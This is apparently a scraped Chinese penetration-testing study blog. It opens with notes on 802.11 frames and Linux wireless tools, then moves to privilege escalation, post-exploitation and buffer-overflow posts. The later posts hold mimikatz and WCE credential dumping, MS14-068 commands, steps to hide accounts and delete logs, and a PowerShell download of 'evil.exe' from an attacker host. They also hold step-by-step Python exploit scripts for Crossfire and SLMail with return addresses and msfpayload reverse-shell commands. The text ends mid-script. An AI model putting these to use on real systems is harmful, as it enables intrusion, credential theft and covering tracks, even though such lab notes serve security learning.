接收信号时无线信号转变为高频电子脉冲，反之发射信号时高频电子脉冲转换为无线电波，这些过程功率往往要产生上万倍的变化，使用W，mW来计数非常不便，而dBm单位通过对功率的对数计算，使用一个较小的数值既可以比较直观的表达功率的变化，因此无线和声学系统都采用了dB这个单位。 全向天线波形图 甜甜圈 天线选择的误区 增益越高越好 高功耗 对周围环境的信号干扰 增益过高的全向天线会变成定向天线 定向天线 双四边形 定向发现信号 功率相同时，比全向天线传输距离更远 八木天线，引向反射天线 平面天线 扇形天线 常用于移动电话网络 3到4个扇形天线联合使用可实现全向信号覆盖 90度扇形天线 120度扇形天线 网状天线 射束带宽更加集中 功率更强 Linux无线协议栈及配置命令802.11协议栈 IEEE802.11 iwconfig iwlist mac80211 iw 无线网卡配置 查看无线网卡 ifconfig iwconfig iw list 信道频率 iwlist wlan2 frequency iw list 扫描附近AP iw dev wlan2 scan | grep SSID iw dev wlan2 scan | egrep “DS\ Parameter\ set | SSID” iwlist wlan2 scanning | egrep “ESSID | Channel” 添加删除侦听端口 service network-manager stop iw dev wlan2 interface add wlan2mon type monitor ifconfig wlan2mon up tcpdump -s 0 -i wlan2mon -p iw dev wlan2mon interface del 协议栈 https://www.kernel.org/doc/htmldocs/80211/index.html 无线驱动 http://linuxwireless.org/en/users/Drivers/ RADIOTAP头部 802.11帧发射和接收的事实标准，802.11依赖Radiotap完成通信过程 Linux系统在驱动和API中内建支持Radiotap 802.11帧发射之前，网卡驱动在802.11头前面添加Radiotap头，反之当网卡接收到无线帧时，驱动通知MAC层，此帧包含Radiotap头 Radiotap为802.11帧传递额外信息，厂家可自定义，因此头长度不固定 不破坏原始头结构，增加传递的信息 分为Header 和 data Version(8bit) 值始终为0 Pad(8bit) 未使用，只作为字段强制对其的占位 Length(16bit) 整个radiotap头长度（可变），作用时确定802.11头的开始位置 Present(32bit) Data段的掩码 Ext(1\0) MAC不能理解的头部直接忽略 802.11 头部 DU（Data Unit) 即数据单元，信息传输的最小数据集合 传递过程逐层封装（Encapsulation) SDU(Service Data Unit) / PDU(Protocol Data Unit) MSDU - MIC - 分帧 - 添加IV – 加密 – 添加MAC头部 —— MPDU MPDU/PSDU + 物理头 = PPDU —— RF发射 Protocol Version (2bit) : 802.11协议版本，始终为0、1、2、 Type(2bit) :规定帧的具体用途（3种帧类型） 控制帧（1） 数据帧（2） 管理帧（0） SubType(4bit) 每个类型对应多个子类型，协议规定不同类型/子类型的帧完成不同功能的操作 To DS / From DS (1 / 1 bit) 标识帧的传输方向，传向DS或者来自DS，这两个字段的值决定着MAC头中4个Address字段的不同定义。 0x00:出现在IBSS环境中（可能是Management帧或者是Control帧类型）；或者是STSL（Station to Station Link)中两个STA间通信，这种情况下通信不通过AP 0x01:表示Data帧从AP向STA传递； 0x02:表示Data帧从STA向AP传递； 0x03:表示两个AP间通信，这是典型的WDS(Wireless Distribution System) 环境中AP间的通信，或者表示Mesh环境下MP间的通信；只有此时才会使用到Address4字段 More frag(1bit): 表示是否还有后续帧 值为1时表示有后续分段，可能是Data或Management帧类型。只有单播接受地址的帧会被分段； Retry(1bit):重传 值为1表示重传帧，可能是Data或Management帧类型，接收端进程使用此值防止帧重复； Power Mgmt(1bit):活动模式（0）/ 省电模式（1） STA处于省电模式时，向关联的AP发送该值为1的帧（AP从不使用此字段），省电模式下STA不接收数据，发送给它的Data帧由AP暂时缓存。 More Data(1bit) 当AP缓存了至少一个MSDU时，会向省电模式的STA发送该值为1的帧，表示有数据要传输给STA，接收到此帧的STA唤醒自己并向AP发送PS-Poll帧，取回由AP为其缓存的数据。也被用于AP有更多的广播/多播帧需要发送的情况。 Protected Frame(1bit) 可能是Data 或 Management 帧类型，表示MSDU是否被加密；也被用于表示PSK身份验证Frame#3帧； 数据载荷为空时，该字段值为0； Order(1bit) 在非QoS帧的情况下，值为1表示数据必须按严格顺序处理，通常为0； Duration/ID (16bit) 所有Control帧都使用该字段，其作用随Type / SubType 变化有所不同 帧类型为PS Poll(type:1, subtype:10)时， 表示STA关联的AID（association identity) 其他情况下该字段作为一种载波侦听机制，表示接收下一帧之间需要保持的时间间隔，用于NAV（Network Allocation Vector)计算，单位是微秒。 MAC Layer Address 补充最后一种： Basic service set ID(BSSID); 它是BSS 的2层唯一标识，Infrastructure 模式中BSSID就是AP的MAC地址，当AP支持多BSS时，随机生成每个BSSID； Sequence Control (16bit) 这个字段包含两个子字段： Sequence Number 和 Fragment Number; Sequence Number 是每个帧的编号，数值范围是0——4095，以1为步长递增。当帧被分段时，同意帧中不同分段的Sequence Number 相同； Fragment Number是被分段的帧用于标识分段位置顺序的编号，数值范围是0——15,以1为步长递增。 Frame Body（变长） 数据字段，未加密的最大MSDU长度为2304字节（其中包含最大256字节的上层头信息，和可被传递的数据2048字节）。不同的加密方法会增加一定的内容长度。 WEP：8 bytes - 2312 bytes TKIP(WPA1): 20 bytes - 2324 bytes CCMP(WPA2): 16 bytes - 2320 bytes control 类型的帧没有Frame Body 内容 FCS（32bit） 发送端对全部MAC包头和Frame Body内容进行CRC计算，计算结果即为FCS（Frame Check Sequence)值，接收端进行同样的计算，结果一致时，则接收端向发送端返回ACK，否则丢弃帧（只对单播帧有效，FCS错误的广播/多播帧可能被接收） wireshark抓包时已经删除了FCS值]]></content>
  </entry>
  <entry>
    <title><![CDATA[提权]]></title>
    <url>%2F2018%2F03%2F21%2F%E6%8F%90%E6%9D%83%2F</url>
    <content type="text"><![CDATA[提权本地提权 已实现本地低权限账号登陆 远程溢出 直接获得账号密码 希望获取更高权限 实现对目标进一步控制 系统账号之间权限隔离 操作系统安全的基础 用户空间 内核空间 系统账号 用户账号登陆时获取权限令牌 服务账号无需用户登陆已在后台启动服务 Windows user Administrator System Linux User Root Windows system账号 系统设置管理功能 SysInternal Suite https://technet.microsoft.com/en-us/sysinternals/bb545027 psexec -i -s -d taskmgr at 19:39 /interactive cmd Win XP Win 2003 sc Create syscmd binPath= &quot;cmd /K start&quot; type=own type=interact sc start syscmd 注入进程提权 隐蔽痕迹 pinjector.exe http://www.tarasco.org/security/Process_Injector/ 抓包嗅探 Windows Wireshark Omnipeek commview Sniffpass Linux Tcpdump Wireshark Dsniff 键盘记录 Keylogger 木马窃取 本地缓存密码 浏览器缓存的密码 IE浏览器 Firefox 网络密码 无线密码 http://www.nirsoft.net Dump SAM Pwdump /usr/share/windows-binaries/fgdump/ ophcrack Windows身份认证WINLOGON.EXE — LSA AUTH API(LSASRV.DLL) — MSV1_0.DLL(NTLM AUTH PKG) WCE(Windows Credential Editor) 内存读取信息 /usr/share/wce 需要管理员权限 wce-universal.exe -l / -lv wce-universal.exe -w 从内存读取LM/NTLM hash Digest Authentication Package NTLM Security Package Kerberos Security Package 防止WCE攻击 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages 其他工具 pwddump localhost fgdump mimikatz privilege::debug #提升权限 sekurlsa::logonPasswords 利用漏洞提权 Ms11-080 Kb2592799 https://technet.microsoft.com/library/security/ms11-080 Pyinstaller https://pypi.python.org/pypi/PyInstaller/2.1 Pywin32 http://sourceforge.net/projects/pywin32/files/pywin32/Build%20219/ MS11-046 DoS MS14-068 库 https://github.com/bidord/pykek ms14-068.py -u user@lab.com -s userSID -d dc.lab.com 拷贝 TGT_user1@lab.com.ccache 到Windows系统 本地管理员登陆 mimikatz.exe log “kerberos::ptc TGT_user@lab.com.ccache“ exit Ubuntu 11.10 http://old-releases.ubuntu.com/releases/11.10/ gcc sudo apt-cdrom add &amp;&amp; sudo apt-get install gcc gcc 18411.c -o exp CVE-2012-0056 /proc/pid/mem kernels&gt;=2.6.39 http://blog.zx2c4.com/749 利用配置不当提权 与漏洞提权相比 更常用的方法 企业环境 补丁更新的全部已经安装 输入变量过滤之外更值得研发关注的安全隐患 以system权限启动 NTFS权限允许users修改删除 icacls icacls c:\windows*.exe /save perm /T i586-mingw32msvc-gcc -o admin.exe Find find / -perm 777 -exec ls -l {} \; 应用系统的配置文件 应用连接数据库的配置文件 后台服务运行账号 基本信息收集 Linux /etc/resolv.conf /etc/passwd /etc/shadow whoami, who -a ifconfig -a, iptables -L -n, ifconfig -a, netstat -r uname -a. ps aux dpkg -l | head Windows ipconfig /all, ipconfig /displaydns, netstat -bnao , netstat -r net view, net view /domain net user /domain, net user %username% /domain net accounts, net share net locakgroup administrators username /add net group “Domain Controllers” /domain net share name$=C:\/unlimited net user username /active:yes /domain WMIC(Windows Management Inustrumentation) • wmic nicconfig get ipaddress,macaddress• wmic computersystem get username• wmic netlogin get name,lastlogon• wmic process get caption, executablepath,commandline• wmic process where name=“calc.exe” call terminate• wmic os get name,servicepackmajorversion• wmic product get name,version• wmic product where name=“name” call uninstall /nointeractive• wmic share get /ALL• wmic /node:”machinename” path Win32_TerminalServiceSetting whereAllowTSConnections=”0” call SetAllowTSConnections “1“• wmic nteventlog get path,filename, writeable 收集敏感数据 商业信息 系统信息 Linux /etc; /usr/local/etc /etc/password; /etc/shadow .ssh .gnupg 公私密钥 The e-mail and data files 业务数据库； 身份认证服务器数据库 /tmp Windows SAM数据库；注册表文件 %SYSTEMROOT%\repair\SAM %SYSTEMROOT%\System32\config\RegBack\SAM 业务数据库；身份认证数据库 临时文件目录 UserProfile\AppData\Local\Microsoft\Windows\Temporary Internet Files\ 隐藏痕迹 禁止在登陆界面显示新建账号 REG ADD “HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\WinLogon\SpecialAccounts\UserList” /v uname /TREG_DWORD /D 0 del %WINDIR%*.log /a/s/q/f History 日志 auth.log / secure btmp / wtmp lastlog /faillog 其他日志和HIDS等]]></content>
  </entry>
  <entry>
    <title><![CDATA[漏洞后利用阶段]]></title>
    <url>%2F2018%2F03%2F19%2F%E6%BC%8F%E6%B4%9E%E5%90%8E%E5%88%A9%E7%94%A8%E9%98%B6%E6%AE%B5%2F</url>
    <content type="text"><![CDATA[后漏洞利用阶段漏洞利用后阶段 上传工具 提权 擦除攻击痕迹 安装后门 长期控制 Dump密码 内网渗透 后漏洞利用阶段 最大的挑战——防病毒软件 使用合法的远程控制软件 上传文件 持久控制 扩大对目标系统的控制能力 Linux系统 netcat curl wget Windows 缺少预装的下载工具 非交互模式shell 类NC远程控制shell ftp 192.168.1.1 传输文件 Tftp Ftp Vbscript Debug 使用TFTP传输文件 XP 2003 默认安装 Win7 2008 需要单独添加 经常被边界防火墙过滤 kali mkdir /tftp atftpd –daemon –port 69 /tftp cp /usr/share/windows-binaries/nc.exe /tftp/ chown -R nobody /tftp windows tftp -i 192.168.10.5 get nc.exe 使用FTP传输文件 kali apt-get install pure-ftpd Windows 1234567echo open 192.168.10.5 21 &gt; ftp.txtecho yuanfh &gt;&gt; ftp.txtecho password &gt;&gt; ftp.txtecho bin &gt;&gt; ftp.txtecho GET nc.exe &gt;&gt; ftp.txtecho bye &gt;&gt; ftp.txtftp -s:ftp.txt 使用VBSCRIPT 传输文件 service apache2 start cd /var/www/html cp/ftphome/whoami.exe wget.vbs cscript wget.vbs http://192.168.1.117/nc.exe nc.exe 使用POWERSHELL传输文件 Wget.ps powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1 12345$storageDir = $pwd$webclient = New-Object System.Net.WebClient$url = "http://192.168.10.5/evil.exe"$file = "new-exploit.exe"$webclient.DownloadFile($url,$file) 使用DEBUG传输文件 Debug 汇编、反汇编 16进制dump工具 64K字节 upx压缩文件 wine exe2bat.exe nc.exe nc.txt debug&lt;nc.hex copy 1.dll nc.exe]]></content>
  </entry>
  <entry>
    <title><![CDATA[Linux缓冲区溢出]]></title>
    <url>%2F2018%2F03%2F18%2FLinux%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%2F</url>
    <content type="text"><![CDATA[Linux缓冲区溢出 Crossfire 多人在线RPG游戏 1.9.0版本接受入站socket连接时存在缓冲区溢出漏洞 调试工具 edb 运行平台 kali i486虚拟机 新版本Linux内核支持内存保护机制 DEP ASLR 堆栈cookies 堆栈粉碎 本机调试 iptables -A INPUT -p tcp --destination-port 4444 \!-d 127.0.0.1 -j DROP iptables -A INPUT -p tcp --destination-port 13327 \! -d 127.0.0.1 -j DROP 调试 edb --run /usr/games/crossfire/bin/crossfire 01.py 12 ​ 唯一字符串识别EIP精确位置 /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 4379 /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb 46367046 4368 02.py 03.py 思路： 第一阶段shellcode ESP跳转到EAX 偏移12个字节 setup sound shellcode2 /usr/share/metasploit-framework/tools/exploit nasm_shell.rb add eax,12 jmp eax \x83\xc0\x0c\xff\xe0\x90\x90 查找坏字符 \x00\x0a\x0d\x20 ESP 跳转地址 Opcode search crash = “\x41” * 4368 + “\x97\x45\x13\x08” + “\x83\xc0\x0c\xff\xe0\x90\x90” 设断点（0x08134597) EIP 08134597 jsp esp add eax, 12 jmp eax ​ msfpayload linux/x86/shell_bind_tcp LPORT=4444 R | msfencode -b &quot;\x00\x0a\x0d\x20&quot; ​ 05.py 123456789101112131415#!/usr/bin/pythonimport sockethost = "127.0.0.1"shellcode = ()crash = shellcode + 'A'*(4368-78) + '\x97\x45\x13\x08' +'\x83\xc0\x0c\xff\xe0\x90\x90'buffer = "\x11(setup sound " + crash + "\x90\x00#"s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)print "[*]Sending evil buffer..."s.connect((host, 13327))data=s.recv(1024)print datas.send(buffer)s.close()print "[*]Payload Sent!" 选择和修改EXP 网上公开的EXP代码 选择可信赖的EXP源 Exploit-db SecurityFocus Searchsploit 有能力修改EXP（Python Perl Ruby C C++) searchsploit slmail 646.c 类unix环境下编译 返回地址与我们的环境不符 反弹shell硬编码了回连IP地址 缓冲区偏移量与我们的环境不符 目标IP硬编码 646.c windows环境下编译 apt-get install mingw32 dpkg –add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get installwine32• i586-mingw32msvc-gcc 646.c -lws2_32 -o sl.exe• wine sl.exe 192.168.20.32 不同的EXP 不同的系统补丁 软件版本 不同的offset shellcode 扫描探测目标系统版本，搭建适当的测试环境 避免一锤子测试 修改公开的EXP满足不同环境需要 了解漏洞原理，修改溢出代码]]></content>
  </entry>
  <entry>
    <title><![CDATA[Win缓冲区溢出]]></title>
    <url>%2F2018%2F03%2F17%2FWin%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%2F</url>
    <content type="text"><![CDATA[程序漏洞来源 罪恶的根源：变量 数据与代码边界不清 最简漏洞原理—— shell脚本漏洞 缓冲区溢出 当缓冲区边界限制不严格时，由于变量传入畸形数据或程序运行错误，导致缓冲区被撑爆，从而覆盖了相邻内存区域的数据 成功修改内存数据 ，可造成进程劫持，执行恶意代码，获取服务器控制权等后果 如何发现漏洞 源码审计 逆向工程 模糊测试 向程序堆栈半随机的数据，根据内存变化判断溢出 数据生成器：生成随机、半随机数据 测试工具：识别溢出漏洞 FUZZER SLMail 5.5.0 Mail Server POP3 PASS 命令存在缓冲区溢出漏洞 无需身份验证实现远程代码执行 DEP：阻止代码从数据页被执行 ASLR：随机内存地址加载执行程序和DLL，每次重启地址变化 01.py 12345678910111213141516171819202122#! /usr/bin/pythonimport sockets = socket.socket(socket.AF_INET, socket.SOCK_STREAM)try: print "\nSending evil buffer..." s.connect(('192.168.10.128',110)) data = s.recv(1024) print data s.send('USER admin'+'\r\n') data=s.recv(1024) print data s.send('PASS test\r\n') data = s.recv(1024) print data s.close() print "\nDone!"except: print "Could not connect to POP3!" 测试PASS命令接收到大量数据时是否会溢出 EIP寄存器存放下一条指令的地址 02.py 12345678910111213141516171819#!/usr/bin/pythonimport socketbuffer=["A"]counter=100while len(buffer) &lt;= 30: buffer.append("A"*counter) counter=counter+200 for string in buffer: print "Fuzzing PASS with %s bytes" % len(string) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) connect = s.connect(('192.168.10.128',110)) s.recv(1024) s.send('USER test'+'\r\n') s.recv(1024) s.send('PASS ' + string + '\r\n') s.send('QUIT\r\n') s.close() 2700个字符实现EIP寄存器溢出 03.py 123456789101112131415#!/usr/bin/pythonimport sockets = socket.socket(socket.AF_INET, socket.SOCK_STREAM)buffer='A'*2700try: print "\nSending evil buffer..." s.connect(('192.168.10.128',110)) date = s.recv(1024) s.send('USER test'+'\r\n') data=s.recv(1024) s.send('PASS ' + buffer + '\r\n') print "\nDone!."except: print "Could not connect to POP3!" 找到精确溢出的4个字节 二分法 唯一字符串法 usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700 04.py 12345678910111213141516#!/usr/bin/pythonimport sockets = socket.socket(socket.AF_INET, socket.SOCK_STREAM)buffer='Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9'try: print "\nSending evil buffer..." s.connect(('192.168.10.128',110)) date = s.recv(1024) s.send('USER test'+'\r\n') data = s.recv(1024) s.send('PASS ' + buffer + '\r\n') print "\nDone!."except: print "Could not connect to POP3!" ./pattern_offect.rb -q 39694438 05.py 123456789101112131415#!/usr/bin/pythonimport sockets = socket.socket(socket.AF_INET, socket.SOCK_STREAM)buffer="A"*2606 + "B"*4+"C"*20try: print "\nSending evil buffer..." s.connect(('192.168.10.128',110)) date = s.recv(1024) s.send('USER test' + '\r\n') data = s.recv(1024) s.send('PASS ' + buffer + '\r\n') print "\nDone!."except: print "Could not connect to POP3!" 思路： 将EIP修改为shellcode代码的内存地址，将Shellcode写入到该地址空间，程序读取EIP寄存器数值，将跳转到shellcode代码段并执行 寻找可寻访shell code的内存空间 06.py 123456789101112131415#!/usr/bin/pythonimport sockets = socket.socket(socket.AF_INET, socket.SOCK_STREAM)buffer = "A"*2606 + "B"*4 + "C"*(3500-2605-4)try: print "\nSending evil buffer..." s.connect(('192.168.10.128',110)) date = s.recv(1024) s.send('USER test' + '\r\n') data = s.recv(1024) s.send('PASS ' + buffer + '\r\n') print "\nDone!."except: print "Could not connect to POP3!" 不同类型的程序、协议、漏洞，会将某些字符认为是坏字符，这些字符有固定用途 返回地址、Shellcode、buffer中都不能出现坏字符 null byte (0x00)空字符，用于终止字符串的拷贝操作 return (0x0D) 回车操作，表示POP3 PASS命令输入完成 思路：发送0x00-0xff256个字符，查找所有坏字符 07.py 12345678910111213141516171819#!/usr/bin/pythonimport sockets = socket.socket(socket.AF_INET, socket.SOCK_STREAM)badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff\x00")buffer = "A"*2606 + "B"*4 + badcharstry: print "\nSending evil buffer..." s.connect(('192.168.10.128',110)) date = s.recv(1024) s.send('USER test' + '\r\n') data = s.recv(1024) s.send('PASS ' + buffer + '\r\n') s.close() print "\nDone!."except: print "Could not connect to POP3!" 0A 0D 00 三个坏字符 重定向数据流 用ESP地址替换EIP的值 但是ESP地质变化，硬编码不可行 SLMail 线程应用程序，操作系统为每个线程分配一段地址范围，每个线程地址范围不确定 变通思路 在内存中寻找地址固定的系统模块 在模块中寻找JMP ESP 指令的地址跳转， 再由该指令间接跳转到ESP，从而执行shellcode mona.py脚本识别内存模块，搜索”return address“是JMP ESP指令的模块 寻找无DEP、ALSR保护的内存地址 内存地址不包含坏字符 寻找不受保护的系统模块 ！mona modules Rebase 操作系统重启后是否发生变化，不发生变化False 后三项为系统保护机制 前四列False 最后一列为True /usr/share/metasploit-framework/tools/exploit nasm_shell.rb 将汇编指令转化为二进制 将 jmp esp 转换 为二进制 FFE4 ！mona find -s &quot;\xff\xe4&quot; -m openc32.dll 找不到 ！mona find -s &quot;\xff\xe4&quot; -m slmfc.dll 选择不包含坏字符的内存地址 如果是支持DEP的程序， 就必须找到在Memory map 中 Access权限 R E 都有的 重发buffer 08.py 123456789101112131415161718#!/usr/bin/pythonimport socket s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)buffer = "A" * 2606 + "\xe3\x41\x4b\x5f" + "C"*390try: print "\nSending evil buffer..." s.connect(('192.168.10.128',110)) date = s.recv(1024) s.send('USER test' + '\r\n') data = s.recv(1024) s.send('PASS ' + buffer + '\r\n') s.close() print "\nDone!."except: print "Could not connect to POP3!" 生成shellcode Scratch /usr/share/framework2 ./msfpayload -l ./msfpayload win32_reverse LHOST=10.10.10.128 LPORT=444 C ./msfpayload win32_reverse LHOST=10.10.10.128 LPORT=444 C | grep 0d 检查发现有坏字符 ./msfpayload win32_reverse LHOST=10.10.10.128 LPORT=444 R | ./msfencode -b &quot;\x00\x0a\x0d&quot; 去除 09.py 1234567891011121314151617181920212223242526272829303132333435363738#!/usr/bin/pythonimport sockets = socket.socket(socket.AF_INET, socket.SOCK_STREAM)shellcode = 